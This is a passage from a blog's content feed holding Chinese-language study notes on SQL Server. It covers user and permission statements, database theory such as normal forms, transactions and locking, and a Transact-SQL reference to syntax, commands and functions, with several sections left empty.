href="#4-查看索引" class="headerlink" title="4 查看索引"></a>4 查看索引</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看索引</span><br><span class="line"><span class="keyword">exec</span> sp_helpindex [<span class="variable">@objname</span> <span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span></span><br><span class="line"># 改索引名</span><br><span class="line"><span class="keyword">exec</span> sp_rename <span class="string">&#x27;index_name&#x27;</span> <span class="string">&#x27;index_newname&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="五、用户"><a href="#五、用户" class="headerlink" title="五、用户"></a>五、用户</h2><blockquote><p>  <a href="https://www.cnblogs.com/adamans/articles/12023579.html">用户操作</a></p></blockquote><h3 id="1-创建用户"><a href="#1-创建用户" class="headerlink" title="1 创建用户"></a>1 创建用户</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建登入用户</span></span><br><span class="line"><span class="keyword">create</span> login login_name <span class="keyword">with</span> password <span class="operator">=</span> <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建数据库用户</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> user_name [<span class="keyword">for</span> login login_name]</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-修改用户"><a href="#2-修改用户" class="headerlink" title="2 修改用户"></a>2 修改用户</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-删除用户"><a href="#3-删除用户" class="headerlink" title="3 删除用户"></a>3 删除用户</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-赋予权限"><a href="#4-赋予权限" class="headerlink" title="4 赋予权限"></a>4 赋予权限</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">create</span>  <span class="keyword">on</span> database_name <span class="keyword">to</span> user_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> sp_addrolemember <span class="string">&#x27;db_owner&#x27;</span> <span class="string">&#x27;user_name&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-移除权限"><a href="#5-移除权限" class="headerlink" title="5 移除权限"></a>5 移除权限</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">create</span> <span class="keyword">on</span> database_name <span class="keyword">from</span> user_name</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="六、规则与默认"><a href="#六、规则与默认" class="headerlink" title="六、规则与默认"></a>六、规则与默认</h2><h3 id="1-创建规则"><a href="#1-创建规则" class="headerlink" title="1  创建规则"></a>1  创建规则</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-删除规则"><a href="#2-删除规则" class="headerlink" title="2 删除规则"></a>2 删除规则</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-绑定规则"><a href="#3-绑定规则" class="headerlink" title="3 绑定规则"></a>3 绑定规则</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-创建默认"><a href="#1-创建默认" class="headerlink" title="1 创建默认"></a>1 创建默认</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-删除默认"><a href="#2-删除默认" class="headerlink" title="2 删除默认"></a>2 删除默认</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-绑定默认"><a href="#3-绑定默认" class="headerlink" title="3 绑定默认"></a>3 绑定默认</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="七、案例查询"><a href="#七、案例查询" class="headerlink" title="七、案例查询"></a>七、案例查询</h2><h3 id="1-所有查询"><a href="#1-所有查询" class="headerlink" title="1 所有查询"></a>1 所有查询</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询所有数据表</span></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> type <span class="operator">=</span> <span class="string">&#x27;U&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询所有约束</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.objects <span class="keyword">where</span> type <span class="keyword">in</span> (<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;pk&#x27;</span>,<span class="string">&#x27;uq&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询所有视图</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;V&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="八、提示"><a href="#八、提示" class="headerlink" title="八、提示"></a>八、提示</h2><ul><li>引号中打引号用 <code>&#39;&#39;</code> （两个单引号）</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库理论</title>
      <link href="/posts/d4ae3e2e.html"/>
      <url>/posts/d4ae3e2e.html</url>
      
        <content type="html"><![CDATA[<h1 id="数据库理论"><a href="#数据库理论" class="headerlink" title="数据库理论"></a>数据库理论</h1><blockquote><p><a href="https://blog.csdn.net/xunxue1523/article/details/118195302">SQL Server 2012 安装教程</a></p><p><a href="https://blog.csdn.net/li_stone_123/article/details/80453583">Sqlserver2012评估期已过问题解决</a></p></blockquote><hr><h2 id="一、概论"><a href="#一、概论" class="headerlink" title="一、概论"></a>一、概论</h2><hr><h2 id="二、关系"><a href="#二、关系" class="headerlink" title="二、关系"></a>二、关系</h2><hr><h2 id="三、SQL语句"><a href="#三、SQL语句" class="headerlink" title="三、SQL语句"></a>三、SQL语句</h2><blockquote><p><a href=".\SQL语句">text::SQL语句</a> </p></blockquote><h3 id="1-表类型"><a href="#1-表类型" class="headerlink" title="1 表类型"></a>1 表类型</h3><ul><li><p>实表</p><blockquote><p>基本关系,又称基本表或者基表,是实际存储数据的逻辑表示。</p></blockquote></li><li><p>虚表</p><blockquote><p>由基本表或其他的表导出的表，不对应实际存储的数据</p></blockquote></li><li><p>临时表</p><blockquote><p>查询结果。</p></blockquote></li></ul><hr><h2 id="四、范式"><a href="#四、范式" class="headerlink" title="四、范式"></a>四、范式</h2><h3 id="1-范式理论"><a href="#1-范式理论" class="headerlink" title="1 范式理论"></a>1 范式理论</h3><ol><li><p>1NF</p><blockquote><p>原子性，字段不可再分，否则就不是关系型数据库。</p></blockquote></li><li><p>2NF</p><blockquote><p>唯一性，一个表只说明一个事物。</p></blockquote></li><li><p>3NF</p><blockquote><p>每列都与主键有直接关系，不存在传递依赖。</p></blockquote></li></ol><hr><h2 id="五、安全"><a href="#五、安全" class="headerlink" title="五、安全"></a>五、安全</h2><h3 id="1-安全性控制"><a href="#1-安全性控制" class="headerlink" title="1 安全性控制"></a>1 安全性控制</h3><blockquote><p>非法访问。</p></blockquote><h3 id="2-完整性控制"><a href="#2-完整性控制" class="headerlink" title="2 完整性控制"></a>2 完整性控制</h3><blockquote><p>数据完整。</p></blockquote><ul><li><p>脏数据</p><blockquote><p>在数据库技术中,脏数据在临时更新（脏读）中产生。事务A更新了某个<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=452927&amp;ss_c=ssc.citiao.link">数据项</a>X，但是由于某种原因，事务A出现了问题，于是要把A回滚。​</p><p>但是在回滚之前，另一个事务B读取了数据项X的值(A更新后)，A回滚了事务，数据项恢复了原值。</p><p>事务B读取的就是数据项X的就是一个“临时”的值，就是脏数据。</p></blockquote></li></ul><h3 id="3-并发性控制"><a href="#3-并发性控制" class="headerlink" title="3 并发性控制"></a>3 并发性控制</h3><ul><li><p>事务</p><ul><li>原子性：操作不可中断。</li><li>一致性：成功改变状态。</li><li>隔离性：事务间不可互相干扰。</li><li>持久性：改变恒存在。</li></ul></li><li><p>并发</p></li><li><p>封锁</p><ul><li>排他型封锁（X封锁）：单个事物对某对象读写，其他事务不可。</li><li>共享封锁（S封锁）：多个事务只可对某个对象一起读，不可改。</li></ul></li></ul><h3 id="4-备份"><a href="#4-备份" class="headerlink" title="4 备份"></a>4 备份</h3><hr><h2 id="六、设计"><a href="#六、设计" class="headerlink" title="六、设计"></a>六、设计</h2><hr><h2 id="七、T-SQL"><a href="#七、T-SQL" class="headerlink" title="七、T-SQL"></a>七、T-SQL</h2><ul><li><a href=".\Transact——SQL">text::Transact——SQL</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Transact——SQL</title>
      <link href="/posts/a0eceee2.html"/>
      <url>/posts/a0eceee2.html</url>
      
        <content type="html"><![CDATA[<h1 id="Transact——SQL"><a href="#Transact——SQL" class="headerlink" title="Transact——SQL"></a>Transact——SQL</h1><hr><h2 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h2><ul><li><p>定义</p><blockquote><p>Transact-SQL就是在标准SQL的基础上进行扩充而推出的SQL Server专用的结构化SQL，引入了程序设计的思想，增强了程序的流程控制语句等。</p></blockquote></li></ul><hr><h2 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h2><ul><li><p>全局变量</p><blockquote><p>定义：全局变量是由系统定义和维护的，用户只能使用预先说明及定义的全局变量。因此，全局变量对于用户来说是只读的。<br>使用全局变量时必须以”@@”开头。</p></blockquote></li><li><p>局部变量</p><blockquote><p>定义：局部变量是由用户自定义的变量，其名称命名规则同标识符的命名规则，不区分大小写。</p></blockquote><ol><li><p>声明（局部变量必须先声明才可以使用）</p><p><code>declare @var type [, @var type , ...]</code></p></li><li><p>赋值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 可以多行赋值，用,隔开</span></span><br><span class="line"><span class="keyword">select</span> <span class="variable">@var</span> <span class="operator">=</span> <span class="keyword">value</span> [, <span class="variable">@var</span> <span class="operator">=</span> <span class="keyword">value</span>  , ...]</span><br><span class="line"><span class="comment">-- 不可以多行赋值</span></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@var</span> <span class="operator">=</span> <span class="keyword">value</span></span><br><span class="line"></span><br><span class="line"># 案例</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@id</span> <span class="type">char</span>(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@id</span> <span class="operator">=</span> <span class="string">&#x27;10010001&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>输出</p><p><code>print @var</code>：print输出是文本输出，而不是一列</p></li></ol></li><li><p>注释符</p><blockquote><p>—  ：注释一行。</p><p>/**/ ：注释全部。</p></blockquote></li></ul><hr><h2 id="三、运算符"><a href="#三、运算符" class="headerlink" title="三、运算符"></a>三、运算符</h2><ul><li><p>算术运算符</p><blockquote><p>+ - * / %</p></blockquote></li><li><p>赋值运算符</p><blockquote><p>=</p></blockquote></li><li><p>字符串连接运算符</p><blockquote><p>“This is :” + “ apple.” = “This is : apple.”</p></blockquote></li><li><p>比较运算符</p><blockquote><p>=   &gt;    &lt;    &gt;=    &lt;=    &lt;&gt;（不等于）    （后面为非SQL-92标准）!=     !&lt;     !&gt;</p></blockquote></li><li><p>逻辑运算符</p><blockquote><p>all and any between exists in like not or some（一系列操作数中有些值为true结果为true）</p></blockquote></li><li><p>按位运算符</p><blockquote><p>&amp;    |    ^</p></blockquote></li><li><p>一元运算符</p><blockquote><p>+ - （ 正号负号）   ~（取反）</p></blockquote></li><li><p>运算符优先级<img src="/posts/a0eceee2/运算符优先级.jpg" alt="img"></p></li></ul><hr><h2 id="四、批处理"><a href="#四、批处理" class="headerlink" title="四、批处理"></a>四、批处理</h2><ul><li><p>go语句</p><blockquote><p><a href="https://www.cnblogs.com/Ting-light/p/9541279.html">语句</a></p></blockquote><ul><li><p>语法</p><p><code>​statement</code></p><p><code>​go</code></p></li><li><p>特点</p><blockquote><p>一个批处理内的所有语句要么放在一起通过解析，要么没有一句能执行。</p></blockquote></li><li><p>SQL Server中go语句使用注意事项</p><ol><li>GO 命令和 Transact-SQL 语句不能在同一行中.但在 GO 命令行中可包含注释。</li><li>用户必须遵照使用批处理的规则.例如,在同一批处理中,创建数据库之后不能直接使用其新建的数据库。</li><li>局部（用户定义）变量的作用域限制在一个批处理中,不可在 GO 命令后引用。</li><li>每个被GO分隔的语句都是一个单独的事务，一个语句执行失败不会影响其它语句执行。</li><li>GO [count] count 为正整数.指定GO 之前的批处理执行指定的次数。</li></ol></li></ul></li></ul><hr><h2 id="五、流程控制语句"><a href="#五、流程控制语句" class="headerlink" title="五、流程控制语句"></a>五、流程控制语句</h2><h3 id="1-begin…end"><a href="#1-begin…end" class="headerlink" title="1 begin…end"></a>1 begin…end</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"># 用途：begin...end用来设定一个程序块，将在begin...end中的所有程序视为一个单元执行。</span><br></pre></td></tr></table></figure><h3 id="2-if…else"><a href="#2-if…else" class="headerlink" title="2 if…else"></a>2 if…else</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if <span class="operator">&lt;</span>exp<span class="operator">&gt;</span>  </span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> </span><br><span class="line">[<span class="keyword">else</span> if <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> ]</span><br><span class="line">[<span class="keyword">else</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> ]</span><br></pre></td></tr></table></figure><h3 id="3-if-not-exists"><a href="#3-if-not-exists" class="headerlink" title="3 if [not] exists"></a>3 if [not] exists</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if [<span class="keyword">not</span>] <span class="keyword">exists</span> (<span class="keyword">select</span> 子查询)</span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> </span><br><span class="line">[<span class="keyword">else</span></span><br><span class="line"><span class="operator">&lt;</span>statement<span class="operator">&gt;</span> ]</span><br><span class="line"># if <span class="keyword">exists</span> 语句用于检测数据是否存在</span><br></pre></td></tr></table></figure><h3 id="4-case"><a href="#4-case" class="headerlink" title="4 case"></a>4 case</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 用法<span class="number">1</span>：</span><br><span class="line"><span class="keyword">case</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    [ <span class="keyword">else</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> ]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"># 该语句是将<span class="keyword">case</span>后面表达式与<span class="keyword">when</span>子句中的表达式的值进行比较，如果相等返回<span class="keyword">then</span>并跳出<span class="keyword">case</span>。当<span class="keyword">case</span>中没有<span class="keyword">else</span>时全部失败返回<span class="keyword">null</span>。</span><br><span class="line"></span><br><span class="line"># 用法<span class="number">2</span>：</span><br><span class="line"><span class="keyword">case</span></span><br><span class="line">    <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">    ... </span><br><span class="line">   <span class="keyword">when</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> <span class="keyword">then</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line">   [ <span class="keyword">else</span> <span class="operator">&lt;</span>exp<span class="operator">&gt;</span> ]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"># 该语句是若<span class="keyword">when</span>为真则返回<span class="keyword">then</span>并跳出<span class="keyword">case</span>。当<span class="keyword">case</span>中没有<span class="keyword">else</span>时全部失败返回<span class="keyword">null</span>。</span><br><span class="line"></span><br><span class="line"># <span class="keyword">case</span>命令可以嵌套到<span class="keyword">SQL</span>命令中</span><br><span class="line">sex<span class="operator">=</span></span><br><span class="line"><span class="keyword">case</span> ... <span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="5-while…continue…break"><a href="#5-while…continue…break" class="headerlink" title="5 while…continue…break"></a>5 while…continue…break</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">while <span class="operator">&lt;</span>exp<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="operator">&lt;</span>statement<span class="operator">&gt;</span></span><br><span class="line">    [ break ]</span><br><span class="line">    [ continue ]</span><br><span class="line">    [statement]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="6-waitfor"><a href="#6-waitfor" class="headerlink" title="6 waitfor"></a>6 waitfor</h3><h3 id="7-goto"><a href="#7-goto" class="headerlink" title="7 goto"></a>7 goto</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 相当于jmp，先设定标识符，再jmp至标识符处</span><br><span class="line">goto 标识符</span><br></pre></td></tr></table></figure><h3 id="8-return"><a href="#8-return" class="headerlink" title="8 return"></a>8 return</h3><p><code>return ([整数值])</code></p><ul><li><p>RETURN语句用于无条件地终止一个查询、存储过程或者批处理，此时位于RETURN语句之后的程序将不会被执行。</p></li><li><p>return 不指定返回 0</p></li><li>return 不能返回null</li><li>return语句返回值<img src="/posts/a0eceee2/return值.jpg" alt="img"></li></ul><hr><h2 id="六、常用命令"><a href="#六、常用命令" class="headerlink" title="六、常用命令"></a>六、常用命令</h2><h3 id="1-backup"><a href="#1-backup" class="headerlink" title="1 backup"></a>1 backup</h3><blockquote><p>用处：备份。</p></blockquote><h3 id="2-restore"><a href="#2-restore" class="headerlink" title="2 restore"></a>2 restore</h3><blockquote><p>用处：备份。</p></blockquote><h3 id="3-checkpoint"><a href="#3-checkpoint" class="headerlink" title="3 checkpoint"></a>3 checkpoint</h3><ul><li>用处：将当前工作的数据库中被更改过的数据页或日志页从数据缓冲区中强制写入硬盘。</li><li>用法：<code>checkpoint [ checkpoint_duration ]</code></li><li>参数为int且必须大于0，单位为秒，表示SQL Server数据库引擎会在请求的持续时间内尝试执行检查点。</li><li>省略则SQL Server数据库引擎会自动调整检查点时间。</li></ul><h3 id="4-DBCC"><a href="#4-DBCC" class="headerlink" title="4 DBCC"></a>4 DBCC</h3><blockquote><p>用处：验证数据库完整性，查找错误，分析系统使用等等。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">dbcc 子命令</span><br><span class="line">decc help ( <span class="string">&#x27;?&#x27;</span> ) # 可以查询DBCC使用的所有命令。</span><br><span class="line">dbcc help ( <span class="string">&#x27;子命令&#x27;</span> ) # 可以查指定命令的用法。</span><br></pre></td></tr></table></figure><h3 id="5-declare"><a href="#5-declare" class="headerlink" title="5 declare"></a>5 declare</h3><blockquote><p>用处：声明局部变量，游标变量，表变量。</p><p><a href="https://www.cnblogs.com/xcj26/archive/2012/05/31/2528840.html">定义表</a></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> &#123;&#123; @ lcoal_variable data_type &#125;</span><br><span class="line"><span class="operator">|</span> &#123; @ cursor_variable_name <span class="keyword">CURSOR</span> &#125;</span><br><span class="line"><span class="operator">|</span> &#123; table_type_definition &#125;</span><br><span class="line">&#125; [ , ... n ]</span><br><span class="line"># 不能声明 text，ntext，image类型。</span><br><span class="line"></span><br><span class="line"># 表定义：</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@order</span> <span class="keyword">table</span>(ID <span class="type">int</span>,Name <span class="type">varchar</span>(<span class="number">20</span>))</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@Detail</span> <span class="keyword">table</span>(ID <span class="type">int</span>,Price <span class="type">float</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="variable">@order</span>(ID,Name) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;aa&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;bb&#x27;</span>),(<span class="number">3</span>,<span class="string">&#x27;cc&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="variable">@Detail</span>(ID,Price) <span class="keyword">values</span>(<span class="number">1</span>,<span class="number">10.5</span>),(<span class="number">2</span>,<span class="number">12.3</span>),(<span class="number">4</span>,<span class="number">5.9</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="variable">@order</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="variable">@Detail</span></span><br></pre></td></tr></table></figure><h3 id="6-execute"><a href="#6-execute" class="headerlink" title="6 execute"></a>6 execute</h3><blockquote><p>execute 或 exec 执行存储过程。</p></blockquote><h3 id="7-kill"><a href="#7-kill" class="headerlink" title="7 kill"></a>7 kill</h3><blockquote><p>kill 命令用于终止某一过程的执行。</p></blockquote><h3 id="8-print"><a href="#8-print" class="headerlink" title="8 print"></a>8 print</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">print <span class="string">&#x27;any ASCII text&#x27;</span> <span class="operator">|</span> @ local_variable <span class="operator">|</span> @@ <span class="keyword">FUNCTION</span> <span class="operator">|</span> string_expression</span><br><span class="line"></span><br><span class="line"># print可以用 <span class="string">&#x27; + &#x27;</span> 拼接多个变量输出在同一行。</span><br><span class="line">print <span class="variable">@x</span> <span class="operator">+</span> <span class="variable">@y</span> </span><br></pre></td></tr></table></figure><h3 id="9-raiserror"><a href="#9-raiserror" class="headerlink" title="9 raiserror"></a>9 raiserror</h3><blockquote><p>用于在SQL Server系统返回错误信息时返回用户指定信息。</p></blockquote><h3 id="10-select"><a href="#10-select" class="headerlink" title="10 select"></a>10 select</h3><blockquote><p>用于变量赋值。</p></blockquote><p><code>select &#123; @local_variable = expression &#125; [ , ... n ]</code></p><h3 id="11-set"><a href="#11-set" class="headerlink" title="11 set"></a>11 set</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、局部变量赋值</span><br><span class="line"><span class="keyword">set</span> &#123; &#123; <span class="variable">@local_variable</span> <span class="operator">=</span> expression &#125; <span class="operator">|</span> &#123; <span class="variable">@cursor_variable</span> <span class="operator">=</span></span><br><span class="line">            &#123; <span class="variable">@cursor_variable1</span> cursor_name</span><br><span class="line">                   <span class="operator">|</span> &#123; <span class="keyword">cursor</span></span><br><span class="line">                   [ forward_only <span class="operator">|</span> <span class="keyword">scroll</span> ]</span><br><span class="line">                   [ <span class="keyword">static</span> <span class="operator">|</span> keyset <span class="operator">|</span> <span class="keyword">dynamic</span> <span class="operator">|</span> optimistic ]</span><br><span class="line">                   [ read_only <span class="operator">|</span> scroll_lcoks <span class="operator">|</span> optimistic ]</span><br><span class="line">                   [ type_warning ]</span><br><span class="line">                   <span class="keyword">for</span> select_statement</span><br><span class="line">                   [ <span class="keyword">for</span> &#123; read <span class="keyword">only</span></span><br><span class="line">                   <span class="operator">|</span> <span class="keyword">update</span> [ <span class="keyword">of</span> column_name [ , ... n ] &#125; ]            </span><br><span class="line">&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、用于用户执行<span class="keyword">SQL</span>命令时，<span class="keyword">SQL</span> Server处理选项的设定。</span><br><span class="line"><span class="keyword">SET</span>：<span class="keyword">ON</span></span><br><span class="line"><span class="keyword">SET</span>：OFF</span><br><span class="line"><span class="keyword">SET</span>：选项值</span><br></pre></td></tr></table></figure><h3 id="12-shutdown"><a href="#12-shutdown" class="headerlink" title="12 shutdown"></a>12 shutdown</h3><blockquote><p>停止SQL Server执行。</p></blockquote><p><code>shutdown [ with nowait ]</code></p><ul><li>带参数：立刻停止SQL Server，终止所有的用户过程并对每一个现行的事务发生一个回滚后退出SQL Server。</li><li>不带参数<ol><li>阻止任何用户登入SQL Server。</li><li>等待尚未完成的Transact-SQL命令或存储过程执行完毕。</li><li>在每个数据库中执行checkpoint命令。</li><li>停止SQL Server执行。</li></ol></li></ul><h3 id="13-use"><a href="#13-use" class="headerlink" title="13 use"></a>13 use</h3><blockquote><p>用处：切换使用数据库。（需要有权限）</p></blockquote><p><code>use &#123; database &#125;</code></p><hr><h2 id="七、常用函数"><a href="#七、常用函数" class="headerlink" title="七、常用函数"></a>七、常用函数</h2><h3 id="1-统计"><a href="#1-统计" class="headerlink" title="1 统计"></a>1 统计</h3><ul><li><p>stdev</p><blockquote><p>返回表达式中所有数据的标准差。</p><p>表达式中NULL会被忽略，数据类型为NUMERIC或类似的列，返回float类型。</p></blockquote><p><code>stdev (exp)</code></p></li><li><p>stdevp</p><blockquote><p>返回表达式中所有数据的总体标准差，其他同上。</p></blockquote><p><code>stdevp  (exp)</code></p></li><li><p>var</p><blockquote><p>返回表达式中所有数据的统计变异数。</p></blockquote><p><code>var (exp)</code></p></li><li><p>varp</p><blockquote><p>返回表达式中所有数据的总体变异数。</p></blockquote><p><code>​varp (exp)</code></p></li></ul><h3 id="2-算术-redirectedfrom-MSDN"><a href="#2-算术-redirectedfrom-MSDN" class="headerlink" title="2 算术?redirectedfrom=MSDN)"></a>2 <a href="https://learn.microsoft.com/zh-cn/previous-versions/sql/sql-server-2005/ms177516(v=sql.90">算术</a>?redirectedfrom=MSDN)</h3><h3 id="3-字符串"><a href="#3-字符串" class="headerlink" title="3 字符串"></a>3 字符串</h3><ul><li><p>字符串转换</p><ul><li><p>ascii</p><blockquote><p>ascii - &gt; int 输出。</p></blockquote><p><code>ascii ( character_expression )</code></p></li><li><p>char</p><blockquote><p>int- &gt; ascii 输出。</p></blockquote><p><code>char ( integer_expression )</code></p></li><li><p>lower</p><blockquote><p>str 全小写。</p></blockquote><p><code>lower ( integer_expression )</code></p></li><li><p>upper</p><blockquote><p>str 全大写。</p></blockquote><p><code>upper ( integer_expression )</code></p></li><li><p>str</p><blockquote><p>int -&gt; str ()。</p></blockquote><p><code>str ( float  _expression [ , length [ , &lt; decimal &gt;]] )</code></p><ul><li>length：返回字符串长度。</li><li>decimal：返回小数位数。</li><li>decimal大于length返回length个 *</li></ul></li></ul></li><li><p>去空格函数</p><ul><li><p>ltrim</p><blockquote><p>去左空格</p></blockquote><p><code>ltrim ( character_expression )</code></p></li><li><p>rtrim</p><blockquote><p>去右空格</p></blockquote><p><code>rtrim ( character_expression )</code></p></li></ul></li><li><p>取子串函数</p><ul><li><p>left</p><blockquote><p>取最左边到第 integer_expression 个字符的部分</p></blockquote><p><code>left ( character_expression , integer_expression )</code></p></li><li><p>right</p><blockquote><p>取最右边到第 integer_expression 个字符的部分</p></blockquote><p><code>right ( character_expression , integer_expression 